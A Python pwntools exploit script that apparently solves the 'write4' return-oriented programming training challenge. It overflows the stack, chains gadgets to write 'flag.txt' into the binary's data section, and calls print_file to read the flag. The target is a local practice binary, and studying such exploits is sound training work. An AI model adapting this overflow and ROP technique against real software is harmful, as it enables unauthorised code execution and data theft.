from pwn import *


# 10 bytes big and writeable
data_section_start = 0x0000000000601028


# 0x0000000000400691 : pop rsi ; pop r15 ; ret
pop_adr_gadget = pack(0x0000000000400691, 64)

# 0x0000000000400693 : pop rdi ; ret
pop_value_gadget = pack(0x0000000000400693, 64)


# 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
move_gadget = pack(0x0000000000400629, 64)


binary = "./write4"

elf = ELF(binary)

print_file_plt = elf.plt["print_file"]
log.info("print_file_plt: " + hex(print_file_plt) + f" {print_file_plt}")
print_file_plt = print_file_plt


payload = b""
payload += b"A"*(54-8-2-4)

#   FIRST HALF OF DATA
# get adr into register
payload += pop_adr_gadget
payload += pack(data_section_start, 64)  # -> edi
payload += b"C"*8   # -> r15
# get data into register
payload += pop_value_gadget
payload += b"flag"+b"\x00"*4   # -> rdi
payload += move_gadget


# SECOND HALF OF DATA
# get adr into register
payload += pop_adr_gadget
payload += pack(data_section_start+4, 64)   # -> edi
payload += b"C"*8   # -> r15
# get data into register
payload += pop_value_gadget
payload += b".txt"+b"\x00"*4   # -> rdi
payload += move_gadget


# PRINT FILE

payload += pop_value_gadget
payload += pack(data_section_start, 64)
payload += pack(print_file_plt, 64)
payload += b"B"*8   # ret

write("/tmp/docgil", payload)

p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")